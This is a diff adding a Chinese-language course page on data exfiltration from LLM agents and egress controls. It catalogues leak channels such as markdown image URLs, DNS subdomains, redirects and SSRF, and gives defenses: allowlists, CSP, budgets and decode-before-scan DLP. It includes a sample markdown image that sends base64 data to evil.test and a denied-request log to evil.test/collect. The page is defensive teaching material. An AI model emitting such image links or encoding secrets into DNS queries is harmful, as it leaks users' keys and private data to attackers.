@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>04 · 数据外泄与出站控制</title>
+<link rel="stylesheet" href="../assets/style.css">
+<script>
+  window.MathJax = { tex: { inlineMath: [['$','$'],['\\(','\\)']], displayMath: [['$$','$$'],['\\[','\\]']] } };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script>
+</head>
+<body>
+
+<div class="topbar"><div class="inner">
+  <a class="home" href="../index.html">⌂ 课程主页</a>
+  <a href="../glossary.md">术语词典</a>
+  <a href="../references.md">论文清单</a>
+  <span class="spacer"></span>
+  <span style="color:var(--fg-dim)">MODULE 04 / 06</span>
+</div></div>
+
+<div class="wrap">
+
+  <h1>04 · 数据外泄与出站控制</h1>
+  <p class="subtitle">出站通道<strong>一半不需要网络权限</strong>：<strong>只要 agent 能输出文本、而客户端会渲染 markdown，通道就已经存在了</strong>（一张外链图片的 URL 就能带走一个 API key）；而 DNS 查询在多数沙箱里是默认放通的 · <strong>「限制单次请求大小」几乎没有防御价值</strong>——一个 4KB 的私钥用 100 字节/次的 DNS 通道也只需要 41 次查询 · <strong>出站白名单是本课唯一的网络层不变量</strong>：它不判断内容只判断目标，攻击者换说法无效；但它有<strong>四类绕过</strong>——重定向、DNS 侧信道、<strong>白名单内攻击者可控的接收端</strong>、SSRF · 可泄漏量 $\le \min(R \cdot T \cdot B,\ V)$，而<strong>$V$（能读到的数据）是唯一有硬上界的项</strong>——notebook 里那个常驻 agent 的例子：<em>常驻一个月后，降速的效果完全消失</em> · <strong>速率限制的真实作用不是阻止外泄，而是把外泄推入检测器的视野</strong> · DLP 里<strong>「已知秘密的精确匹配」最容易做、效果最好、却最少被做</strong>，而它的前提是<strong>先解码再扫</strong>（不解码时 base64/hex 编码的密钥全部漏掉）</p>
+
+  <div class="meta-box">
+    <div class="item"><div class="k">前置知识</div><div class="v">读过本课模块 03（权限四维与范围检查）；知道 DNS、HTTP、markdown 渲染这三件事各自大概怎么工作</div></div>
+    <div class="item"><div class="k">配套 notebook</div><div class="v"><span class="badge cpu">CPU</span> 04_exfiltration.ipynb（十种出站通道的枚举与带宽估算 / 渲染侧信道：一张图片能带走多少 / 出站白名单的实现与四类绕过 / 分块外泄与速率限制的对抗 / DLP 检测的召回-误伤权衡 / 出站预算：把「泄多少」变成可计算的量）</div></div>
+    <div class="item"><div class="k">核心参考</div><div class="v">Johann Rehberger（wunderwuzzi）关于 markdown 图片渲染外泄与 ASCII smuggling 的公开研究 · Simon Willison 关于 <em>exfiltration vectors</em> 的系列记录 · OWASP LLM02（敏感信息泄露）与 LLM06 · DNS 隧道与隐蔽信道的经典文献（Kaminsky 等）· 本课程 C45（隐私与可信）· C68 模块 05（guardrail 分层）</div></div>
+    <div class="item"><div class="k">预计时长</div><div class="v">读 60 分钟 + 跑 55 分钟</div></div>
+  </div>
+
+  <div class="toc">
+    <h3>本章地图</h3>
+    <ol>
+      <li><a href="#channels">出站通道比你想的多得多</a></li>
+      <li><a href="#render">渲染侧信道：一张图片能带走多少</a></li>
+      <li><a href="#allowlist">出站白名单：唯一的不变量级防御，以及它的四类绕过</a></li>
+      <li><a href="#budget">出站预算：把「能泄多少」变成一个可计算的量</a></li>
+      <li><a href="#dlp">DLP：内容侧检测的位置与它的天花板</a></li>
+      <li><a href="#checklist">出站控制的落地清单</a></li>
+      <li><a href="#monitoring">出站监控：三条高价值告警</a></li>
+      <li><a href="#residual">残余风险：出站控制防不住什么</a></li>
+    </ol>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="channels"><span class="num">1</span>出站通道比你想的多得多</h2>
+  <p>模块 00 说过「对外通信」的定义比直觉宽得多。这一节把它彻底展开——<strong>因为「致命三要素」里最容易去掉的就是这一项，而要去掉它，你首先得知道它有多少个入口。</strong></p>  <table>
+    <thead><tr><th>通道</th><th>机制</th><th>需要 agent 有什么权限</th><th>常被忽略的程度</th></tr></thead>
+    <tbody>
+      <tr><td><strong>HTTP 请求</strong></td><td>直接调用出站接口</td><td>网络访问</td><td>低（大家都知道）</td></tr>
+      <tr><td><strong>发邮件 / 发消息</strong></td><td>把内容作为正文或收件人</td><td>邮件/IM 工具</td><td>低</td></tr>
+      <tr><td><strong>渲染外链图片</strong></td><td>输出 <code>![](https://evil/…?d=DATA)</code>，客户端渲染时发起请求</td><td><strong>只需要「能输出文本」</strong></td><td><strong>极高</strong></td></tr>
+      <tr><td><strong>可点击链接</strong></td><td>输出一个诱导用户点击的链接，数据在 query 里</td><td>只需要能输出文本</td><td><strong>高</strong></td></tr>
+      <tr><td><strong>写公开位置</strong></td><td>写进公开仓库、公开文档、评论区</td><td>写权限</td><td>中</td></tr>
+      <tr><td><strong>DNS 查询</strong></td><td>把数据编码进子域名，权威 DNS 服务器就能收到</td><td>只需要能发起<em>任何</em>域名解析</td><td><strong>极高</strong></td></tr>
+      <tr><td><strong>第三方 API 的副作用</strong></td><td>把数据塞进「搜索关键词」「工单标题」，攻击者从对端读取</td><td>任何写外部系统的工具</td><td><strong>高</strong></td></tr>
+      <tr><td><strong>错误信息回显</strong></td><td>构造一个会把数据带进报错的调用，报错被记录到外部日志</td><td>任何工具</td><td>高</td></tr>
+      <tr><td><strong>时序信道</strong></td><td>用「快慢」编码比特（比如按位决定要不要 sleep）</td><td>任何可观测耗时的操作</td><td>中（带宽极低）</td></tr>
+      <tr><td><strong>提交给用户看的输出</strong></td><td>如果用户会把输出复制到别处</td><td>无</td><td>中</td></tr>
+    </tbody>
+  </table>  <div class="callout danger"><span class="label"></span>
+    <p>第三行与第六行是本节最重要的两条，因为它们<strong>几乎不需要任何权限</strong>：<strong>只要 agent 能输出文本、而客户端会渲染 markdown，外泄通道就已经存在了</strong>——<em>它不需要 HTTP 工具、不需要网络权限、不需要任何「对外通信」的能力声明</em>。<strong>同样，DNS 查询在多数沙箱里是默认放通的</strong>（否则什么都跑不起来），而一次 DNS 查询就能带走几十字节。</p>
+  </div>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>所以「我没给 agent 网络权限，所以它泄不了数据」这个推理是错的。<strong>正确的问法是：<em>从 agent 的输出到攻击者，有没有任何一条路径？</em></strong><em>而这条路径可能完全不经过 agent 的工具</em>——它可能经过<strong>渲染 agent 输出的那个客户端</strong>。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式化地说，出站通道的集合不是 agent 权限集的函数，而是<strong>整个系统（含客户端、日志、下游服务）的可达性图</strong>的函数。<em>agent 只是这张图里的一个节点</em>；「它有没有 HTTP 工具」只决定了其中一条边存不存在。<strong>因此出站控制必须在<em>系统边界</em>上做，而不是在 agent 的工具列表上做</strong>——这是本模块所有具体手段的共同来源。</p></div>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="render"><span class="num">2</span>渲染侧信道：一张图片能带走多少</h2>
+  <p>上一节说渲染通道「几乎不需要权限」。这一节把它的<strong>带宽</strong>算出来，因为带宽决定了它是「理论风险」还是「实际风险」。</p>  <div class="ascii">   agent 输出（纯文本，看起来无害）：
+   ┌────────────────────────────────────────────────────────────────┐
+   │ 已完成分析。                                                     │
+   │ ![loading](https://evil.test/p.png?d=QVBJX0tFWT1za18xMjM0NTY3OA)│
+   └────────────────────────────────────────────────────────────────┘
+                            │
+        客户端渲染 markdown → **自动发起 GET 请求** → 攻击者收到 d= 的内容
+                            │
+        用户看到的：一张加载失败的小图（或者什么都没看到）</div>  <div class="math-block">\[\text{每次请求可带走} \approx \frac{L_{\max} - L_{\text{overhead}}}{\text{编码膨胀率}} \ \text{字节}\]</div>  <table>
+    <thead><tr><th>载体</th><th>长度上限（典型）</th><th>编码</th><th>单次带宽</th><th>评价</th></tr></thead>
+    <tbody>
+      <tr><td>URL query 参数</td><td>约 2000–8000 字符</td><td>base64（膨胀 4/3）</td><td><strong>约 1.5–6 KB</strong></td><td><strong>足够带走 API key、密码、一段对话</strong></td></tr>
+      <tr><td>URL 路径段</td><td>同上</td><td>base64url</td><td>同上</td><td>同上</td></tr>
+      <tr><td><strong>DNS 子域名</strong></td><td>单标签 63 字符，总长 253</td><td>base32（膨胀 8/5）</td><td><strong>约 100 字节/次</strong></td><td>带宽低但<strong>极难封堵</strong></td></tr>
+      <tr><td>图片 alt / title 文本</td><td>无硬限制</td><td>—</td><td>不外发（除非被别处渲染）</td><td>低风险</td></tr>
+      <tr><td>多次请求（分块）</td><td>无上限</td><td>分块 + 序号</td><td><strong>无上限</strong></td><td><strong>速率限制是唯一的约束</strong></td></tr>
+    </tbody>
+  </table>  <div class="callout intuition"><span class="label"></span>
+    <p>第五行是关键：<strong>单次带宽的上限不重要，因为可以分块。</strong><em>一个 4 KB 的密钥文件，用 100 字节/次的 DNS 通道也只需要 40 次查询</em>——而 40 次 DNS 查询在任何监控里都不显眼。<strong>所以「限制单次请求大小」几乎没有防御价值；有价值的是「限制出站的目标」（白名单）与「限制总量」（预算）。</strong></p>
+  </div>  <h3>为什么这个通道特别难防</h3>  <ul>
+    <li><strong>它不在 agent 的权限模型里</strong>——渲染发生在客户端，而客户端通常不参与 agent 的权限检查；</li>
+    <li><strong>它对用户不可见</strong>——一张 1×1 的图片，或者一张加载失败的图，用户不会注意到；</li>
+    <li><strong>「禁止输出图片」是一个产品功能的损失</strong>，所以它经常被以「影响体验」为理由否掉；</li>
+    <li><strong>同类通道很多</strong>：图片之外还有 iframe、link prefetch、CSS 背景图、字体、视频封面——<em>任何会触发自动网络请求的 markdown/HTML 元素</em>。</li>
+  </ul>  <p><strong>可行的防御有三条，按有效性排序</strong>：</p>  <ol>
+    <li><strong>渲染侧的域名白名单</strong>——<em>只允许从你自己的域名加载图片，其他一律不渲染（显示为纯文本链接）</em>。这是唯一的不变量级防御；</li>
+    <li><strong>内容安全策略（CSP）</strong>——在 Web 客户端上用 <code>img-src</code> 等指令限制来源。<em>与第一条同一思想，只是实现层不同</em>；</li>
+    <li><strong>输出侧剥离</strong>——把 agent 输出里的图片语法转成纯文本。<em>有效但是检测性质的</em>（编码变体、HTML 实体等有绕过空间）。</li>
+  </ol>
+
+  <!-- ========================================================= -->
+  <h2 id="allowlist"><span class="num">3</span>出站白名单：唯一的不变量级防御，以及它的四类绕过</h2>
+  <p>模块 00 说「三要素里最容易去掉的是对外通信」。去掉它的具体手段就是<strong>出站白名单</strong>——<em>而它是本课唯一一个「做对了就是不变量」的网络层机制</em>。</p>  <h3>为什么它是不变量</h3>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>白名单的性质与检测器根本不同：<strong>它不判断内容，只判断目标。</strong><em>无论注入写得多巧妙，如果 <code>evil.test</code> 不在白名单里，那个请求就发不出去</em>——而攻击者无法通过「换个说法」来改变这一点。<strong>他必须找到一个在白名单里的目标，而那是一个完全不同、也难得多的问题。</strong></p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式化地说，白名单把出站的目标集合从 $\mathcal{D}$（全部域名）限制到 $A \subset \mathcal{D}$，<strong>而 $|A|$ 通常是个位数</strong>。<em>攻击者的搜索空间从「所有域名」缩小到「$A$ 中恰好可被他控制或读取的那些」</em>，在多数情况下这个集合是空的。这是一个<span class="term">状态可达性</span>层面的约束，而不是<span class="term">概率性</span>的判断——<strong>这就是它与 DLP 检测（第 5 节）的本质区别。</strong></p></div>
+  </div>  <h3>四类绕过，以及各自的修法</h3>  <table>
+    <thead><tr><th>绕过</th><th>机制</th><th>修法</th></tr></thead>
+    <tbody>
+      <tr><td><strong>DNS 侧信道</strong></td><td>白名单只检查 HTTP 目标，但解析域名本身就发出了 DNS 查询</td><td><strong>用固定的内部 DNS 解析器 + 只解析白名单域名</strong>；沙箱内不允许任意 DNS</td></tr>
+      <tr><td><strong>重定向</strong></td><td>请求白名单内的 URL，它 302 跳到攻击者的域名</td><td><strong>禁止跟随重定向</strong>，或对每一跳都做白名单检查</td></tr>
+      <tr><td><strong>白名单内的可写目标</strong></td><td>白名单里有一个「任何人都能读写」的服务（公开粘贴板、公共 issue 追踪）</td><td><strong>白名单要精确到路径/资源，不只是域名</strong>；审阅每一项的可读写性</td></tr>
+      <tr><td><strong>SSRF 式内网穿透</strong></td><td>目标解析到内网地址或元数据服务</td><td><strong>解析后校验 IP 不在私有网段</strong>（含 IPv6 与 <code>169.254.x.x</code>）</td></tr>
+    </tbody>
+  </table>  <div class="callout danger"><span class="label"></span>
+    <p>第三类最隐蔽，也最常见：<strong>白名单里放了一个「看起来无害」的公共服务。</strong><em>比如把某个公开的代码托管站加进白名单（因为要装依赖），而那个站上任何人都能创建一个仓库并读取它收到的内容</em>——<strong>于是白名单里就有了一个攻击者可控的接收端。</strong><em>所以白名单的每一项都要回答：「攻击者能不能在这个域名下控制一个接收数据的地方」。</em></p>
+  </div>  <h3>实现位置：为什么必须在网络层</h3>  <p><strong>白名单不能只在工具层实现</strong>（「只有 <code>http_get</code> 工具会检查目标」），因为第 1 节列的通道里有一半不经过工具。<em>正确的实现位置有三个，通常要同时做</em>：</p>  <ul>
+    <li><strong>网络出口（代理 / 防火墙）</strong>——覆盖所有从沙箱发出的连接，包括 agent 自己写的代码发起的；</li>
+    <li><strong>DNS 解析器</strong>——覆盖 DNS 侧信道；</li>
+    <li><strong>渲染客户端（CSP）</strong>——覆盖渲染侧信道（第 2 节）。</li>
+  </ul>
+
+  <!-- ========================================================= -->
+  <h2 id="budget"><span class="num">4</span>出站预算：把「能泄多少」变成一个可计算的量</h2>
+  <p>白名单管「能发给谁」，预算管「能发多少」。<strong>两者互补：白名单挡住已知的坏目标，预算限制未知漏洞的爆炸半径。</strong></p>  <div class="math-block">\[\text{可泄漏量} \le \min\big(\underbrace{R \cdot T \cdot B}_{\text{速率} \times \text{时长} \times \text{单次带宽}},\ \underbrace{V}_{\text{可访问的数据总量}}\big)\]</div>  <table>
+    <thead><tr><th>约束项</th><th>怎么设</th><th>效果</th><th>代价</th></tr></thead>
+    <tbody>
+      <tr><td><strong>出站请求速率 $R$</strong></td><td>每分钟最多 N 次出站</td><td>把 40 次分块外泄从「几秒」拖到「几分钟」</td><td>低（正常任务很少高频出站）</td></tr>
+      <tr><td><strong>会话时长 $T$</strong></td><td>单会话墙钟上限</td><td>限制持续外泄的窗口</td><td>低</td></tr>
+      <tr><td><strong>单次载荷 $B$</strong></td><td>限制 URL 长度、请求体大小</td><td><strong>效果有限</strong>（可分块）</td><td>低</td></tr>
+      <tr><td><strong>可访问数据量 $V$</strong></td><td><strong>范围限制</strong>（模块 03 第 2 节）</td><td><strong>效果最好</strong>：$V$ 是这个 min 里唯一有硬上界的项</td><td>需要按任务收窄</td></tr>
+      <tr><td><strong>出站总字节</strong></td><td>单会话出站累计上限</td><td>直接限制乘积</td><td>中（需要区分正常的大请求）</td></tr>
+    </tbody>
+  </table>  <div class="callout intuition"><span class="label"></span>
+    <p>这个式子最重要的读法是：<strong>$V$ 是唯一有硬上界的项。</strong><em>速率、时长、载荷都只能「拖慢」外泄，而缩小 $V$ 是真正减少了可被泄漏的东西</em>。<strong>所以「限制 agent 能读到什么」比「限制它能发多快」有效得多</strong>——这又一次回到了模块 03 的范围限制。</p>
+  </div>  <h3>速率限制的一个反直觉性质</h3>  <p>速率限制看起来是一个「拖慢」而不是「阻止」的手段，但它有一个额外的、更重要的作用：<strong>它把外泄变成可检测的。</strong></p>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p><em>一次性发走 4 KB 是一个请求，很难与正常请求区分；而分成 40 次小请求发往同一个目标，是一个明显的模式</em>。<strong>速率限制迫使攻击者进入这个可检测的模式</strong>——它本身不阻止外泄，但它让监控有机会发现。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式化地说，速率限制改变了攻击的<span class="term">可观测特征</span>：在无限制的情况下，外泄的特征是「一个大请求」，而正常流量里也有大请求，所以信噪比很低；<strong>在速率限制下，外泄的特征变成「向同一目标的高频小请求」，而这个模式在正常流量里罕见得多</strong>。<em>所以速率限制与监控是配套的：它不是独立的防御，而是一个把攻击推入检测器视野的手段。</em></p></div>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="dlp"><span class="num">5</span>DLP：内容侧检测的位置与它的天花板</h2>
+  <p>最后讲内容侧：<strong>在数据发出去之前扫一遍，看里面有没有敏感信息。</strong>它有价值，但要放在正确的位置上。</p>  <table>
+    <thead><tr><th>检测类型</th><th>能抓什么</th><th>召回</th><th>误伤</th><th>评价</th></tr></thead>
+    <tbody>
+      <tr><td><strong>结构化模式</strong></td><td>API key、信用卡号、身份证号（有校验位的）</td><td><strong>高</strong></td><td><strong>极低</strong></td><td><strong>性价比最高</strong>——先做这个</td></tr>
+      <tr><td><strong>已知秘密的精确匹配</strong></td><td>从你的密钥库里取出真实值做匹配</td><td><strong>极高</strong></td><td>极低</td><td><strong>被严重低估</strong>（见下）</td></tr>
+      <tr><td><strong>高熵字符串</strong></td><td>疑似密钥/token 的随机串</td><td>中</td><td>中（base64 的正常数据会误报）</td><td>作为辅助信号</td></tr>
+      <tr><td><strong>语义分类</strong></td><td>「这段话包含个人隐私」</td><td>中</td><td><strong>高</strong></td><td>谨慎使用，且只该降级不该阻断</td></tr>
+      <tr><td><strong>编码后的内容</strong></td><td>base64/hex/URL 编码之后的敏感数据</td><td><strong>需要先解码再扫</strong></td><td>—</td><td><strong>最常被漏掉的一步</strong></td></tr>
+    </tbody>
+  </table>  <div class="callout intuition"><span class="label"></span>
+    <p>第二行值得展开，因为它是最容易做、效果最好、却最少被做的一条：<strong>你知道自己的密钥是什么——所以直接用它们的真实值做精确匹配。</strong><em>不需要任何模式识别，不需要任何模型，误伤率接近零，召回率接近 100%</em>（只要出站内容里包含那个字符串）。<strong>而且它同时覆盖了「密钥被编码后外泄」的情形——只要你在扫描前做了解码</strong>（第五行）。</p>
+  </div>  <h3>必须先解码再扫</h3>  <p>第五行是 DLP 实现里最常见的漏洞：<strong>敏感数据被编码之后，模式匹配就失效了。</strong></p>  <pre><code># ❌ 只扫原文
+if API_KEY in outbound_url:
+    block()
+
+# ✓ 先把所有可能的编码变体解出来，再扫
+candidates = [outbound_url]
+candidates += try_base64_decode_all_segments(outbound_url)
+candidates += try_url_decode(outbound_url)
+candidates += try_hex_decode_all_segments(outbound_url)
+candidates += strip_zero_width_chars(outbound_url)      # 不可见字符走私
+for c in candidates:
+    if any(secret in c for secret in KNOWN_SECRETS):
+        block()</code></pre>  <div class="callout warn"><span class="label"></span>
+    <p>关于「不可见字符走私」补一句：<strong>有一类编码把数据藏进Unicode 的不可见字符或变体选择符里</strong>，<em>使得文本在人眼里完全正常，而机器读到的是另一串内容</em>。<strong>所以出站内容与展示给人的内容都应当先做 Unicode 规范化并剥离零宽/控制字符</strong>——这既是 DLP 的前置步骤，也是模块 01 「审计模型实际看到的文本」的延伸。</p>
+  </div>  <h3>DLP 的正确位置</h3>  <p>与 C68 模块 05 的 guardrail 分层完全同构：</p>  <ul>
+    <li><strong>白名单与预算是主防线</strong>（不变量），DLP 是<strong>额外一层</strong>；</li>
+    <li><strong>结构化模式与已知秘密匹配可以直接阻断</strong>（误伤极低）；</li>
+    <li><strong>语义分类只该降级或告警</strong>，不该阻断；</li>
+    <li><strong>所有 DLP 命中都要落审计</strong>——<em>它是「有人在尝试外泄」这个信号的主要来源</em>，而这个信号本身比阻断更有价值（它触发调查）。</li>
+  </ul>
+
+  <!-- ========================================================= -->
+  <h2 id="checklist"><span class="num">6</span>出站控制的落地清单</h2>
+  <p>把前五节压成一份可以逐项打勾的清单，按<strong>有效性</strong>而不是难度排序。</p>  <ol>
+    <li><strong>沙箱默认无网络</strong>，所有出站经过一个显式的代理（模块 03 第 3 节）；</li>
+    <li><strong>代理上的域名白名单</strong>，且<em>每一项都审过「攻击者能否在此控制接收端」</em>；</li>
+    <li><strong>禁止跟随重定向</strong>，或对每一跳做白名单检查；</li>
+    <li><strong>固定的内部 DNS 解析器</strong>，只解析白名单域名（封 DNS 侧信道）；</li>
+    <li><strong>解析后校验 IP</strong> 不在私有网段与元数据地址（封 SSRF）；</li>
+    <li><strong>渲染客户端的 CSP / 域名白名单</strong>（封渲染侧信道）——<em>这一条经常被漏，因为它不在后端</em>；</li>
+    <li><strong>范围限制缩小 $V$</strong>（模块 03）——<em>这是「可泄漏量」公式里唯一有硬上界的项</em>；</li>
+    <li><strong>出站速率与总字节预算</strong>，并<em>把「向同一目标的高频小请求」做成一条告警</em>；</li>
+    <li><strong>已知秘密的精确匹配 + 解码后再扫</strong>；</li>
+    <li><strong>所有出站请求与 DLP 命中落审计</strong>，带 provenance（模块 03 第 6 节）。</li>
+  </ol>  <div class="callout intuition"><span class="label"></span>
+    <p>这十条里，<strong>第 1、2、4、6、7 条是不变量</strong>（做对了就是「不可达」），<strong>第 3、5、8 条是收紧</strong>，<strong>第 9、10 条是检测与可观测</strong>。<em>建设顺序应当按这个分组来，而不是按实现难度</em>——因为不变量的效果不依赖攻击者的水平（模块 00 第 7 节）。</p>
+  </div>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>最后回到模块 00 的那句话：<strong>「致命三要素」里最容易去掉的是第三个（对外通信）。</strong><em>这一模块的十条清单就是「去掉它」的具体含义</em>——而做完前七条之后，一个能读私密数据、也接触不受信内容的 agent，<strong>其数据外泄的链路已经在结构上断开了。</strong></p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>需要诚实地补充它的边界：<strong>出站控制不能防「就地破坏」</strong>（删文件、改配置、发起内部的不可逆操作），也不能防「通过人来外泄」（agent 把数据写在给用户看的输出里，用户复制到别处）。<em>前者靠模块 03 的可逆性与确认，后者本质上无法用技术手段完全解决</em>——<strong>它只能通过「不让 agent 读到不该读的东西」来减轻，也就是再一次回到范围限制（缩小 $V$）。</strong></p></div>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="monitoring"><span class="num">7</span>出站监控：三条高价值告警</h2>
+  <p>前六节讲的都是阻断。这一节讲<strong>看见</strong>——因为阻断掉的攻击如果没被记录，你就不知道有人在打你。</p>  <table>
+    <thead><tr><th>告警</th><th>规则</th><th>为什么高价值</th><th>误报来源</th></tr></thead>
+    <tbody>
+      <tr><td><strong>白名单拒绝的突增</strong></td><td>单会话内被拒的出站请求数超过基线</td><td><strong>它是「有人在尝试外泄」最直接的信号</strong>，而且几乎无误报（正常任务很少撞白名单）</td><td>配置变更后的短期上升</td></tr>
+      <tr><td><strong>同目标高频小请求</strong></td><td>同一 (session, host) 5 分钟内 &gt; N 次且平均体积 &lt; 2KB</td><td>分块外泄的特征（第 4 节）</td><td>正常的轮询与分页</td></tr>
+      <tr><td><strong>DLP 命中</strong></td><td>已知秘密精确匹配或结构化模式命中</td><td><strong>误伤极低</strong>，且命中即确认</td><td>测试数据里的假密钥</td></tr>
+    </tbody>
+  </table>  <div class="callout intuition"><span class="label"></span>
+    <p>第一条被严重低估：<strong>「被白名单拒绝的请求」是一个几乎零误报的攻击信号。</strong><em>正常的 agent 任务极少去连接白名单外的域名——所以一旦出现，要么是配置问题，要么就是有人在尝试外泄</em>。<strong>而很多系统只记录「被拒绝了」这个事实，却没有把它做成告警</strong>，于是这个高质量信号被埋在日志里。</p>
+  </div>  <h3>每条出站记录该带什么</h3>  <pre><code>{
+  "ts": "2026-08-31T10:14:22Z", "session": "sess-9f21",
+  "target": {"host": "evil.test", "path": "/collect", "resolved_ip": "203.0.113.9"},
+  "decision": "denied", "reason": "host_not_allowlisted",
+  "bytes": 1842,
+  "channel": "http_proxy",              // http_proxy | dns | rendered_asset | email
+  "provenance": [                        // ← 与模块 03 的审计链同一个字段
+    {"source": "user", "trust": 2, "ref": "msg-118"},
+    {"source": "web",  "trust": 0, "ref": "https://example.test/a"}
+  ],
+  "dlp": {"hits": ["known_secret_exact"], "decoded_from": "base64"}
+}</code></pre>  <p><strong><code>channel</code> 与 <code>provenance</code> 两个字段是这里的关键</strong>：<em>前者让你能按通道统计（发现「原来 DNS 那条路一直是通的」），后者让你能从一次被拒的请求反查到是哪段内容触发的</em>——<strong>而后者是唯一无法事后补上的字段</strong>（模块 03 第 6 节）。</p>
+
+  <!-- ========================================================= -->
+  <h2 id="residual"><span class="num">8</span>残余风险：出站控制防不住什么</h2>
+  <p>做完前六节的十条清单之后，一个诚实的收尾问题是：<strong>还剩下什么。</strong></p>  <table>
+    <thead><tr><th>残余风险</th><th>为什么出站控制防不住</th><th>该靠什么</th></tr></thead>
+    <tbody>
+      <tr><td><strong>就地破坏</strong></td><td>删文件、改配置、发起内部的不可逆操作——<em>数据没出去，但事情已经坏了</em></td><td><strong>模块 03 的可逆性维度与确认环节</strong></td></tr>
+      <tr><td><strong>通过人外泄</strong></td><td>agent 把数据写进给用户看的输出，用户复制到别处</td><td><strong>只能靠缩小 $V$</strong>（不让 agent 读到不该读的）</td></tr>
+      <tr><td><strong>白名单内的合法泄漏</strong></td><td>把私密数据写进一个白名单内、但读者范围过宽的内部系统</td><td><strong>范围限制精确到资源</strong> + DLP</td></tr>
+      <tr><td><strong>推理式泄漏</strong></td><td>不直接发原文，而是发「关于原文的结论」（是/否、分类、摘要）</td><td><strong>窄接口的信息量上界</strong>（模块 01 第 4 节）</td></tr>
+      <tr><td><strong>时序与资源侧信道</strong></td><td>带宽极低但存在</td><td>实践中通常接受这个残余风险</td></tr>
+    </tbody>
+  </table>  <div class="callout intuition"><span class="label"></span>
+    <p>第四行是最值得单独说的一条，因为它<strong>把话题绕回了模块 01</strong>：<em>如果攻击者不需要拿到原文，只需要拿到「关于原文的一个判断」（比如「这个账户余额是否超过某个数」），那么他需要的带宽只有几比特</em>——<strong>而几比特几乎无法用出站控制封堵</strong>（一次成功/失败的请求就能编码一比特）。<em>唯一有效的手段是限制 agent 输出的信息量本身，也就是双 LLM 的窄接口。</em></p>
+  </div>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>把这五条残余风险合起来看，会发现一个规律：<strong>它们全都指向同一个手段——缩小 agent 能接触到的信息（$V$）与它能产出的信息量。</strong><em>出站控制管的是「数据能不能到达攻击者」，而这五条要么绕过了「出站」这个环节（通过人、通过白名单内系统），要么把数据量压到了出站控制的分辨率之下（推理式泄漏、时序信道）。</em></p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式化地说，出站控制是在<span class="term">通道</span>上设约束，而残余风险来自<em>通道之外</em>或<em>通道容量之下</em>。<strong>要覆盖它们，必须在<span class="term">信源</span>上设约束</strong>——即限制 $H(\text{agent 可访问的信息})$ 与 $H(\text{agent 的输出})$。<em>前者是模块 03 的范围限制，后者是模块 01 的窄接口。</em><strong>这也是为什么本课把这两条反复强调：它们是唯一能覆盖到「通道之外」的手段。</strong></p></div>
+  </div>  <p><strong>最后一句实践建议</strong>：残余风险应当被<em>写下来</em>，而不是被忽略。<em>一份「我们的出站控制防住了 A/B/C，防不住 D/E」的文档，比一份「我们做了出站控制」的声明有用得多</em>——因为它让下一个人知道该往哪里继续。</p>
+
+
+  <div class="pager">
+    <a class="prev" href="../03_sandbox_permissions/03_讲解.html"><div class="dir">← 上一模块</div><div class="t">03 · 沙箱与权限边界</div></a>
+    <a class="next" href="../05_security_eval/05_讲解.html"><div class="dir">下一模块 →</div><div class="t">05 · 安全评测</div></a>
+  </div>
+
+</div>
+</body>
+</html>
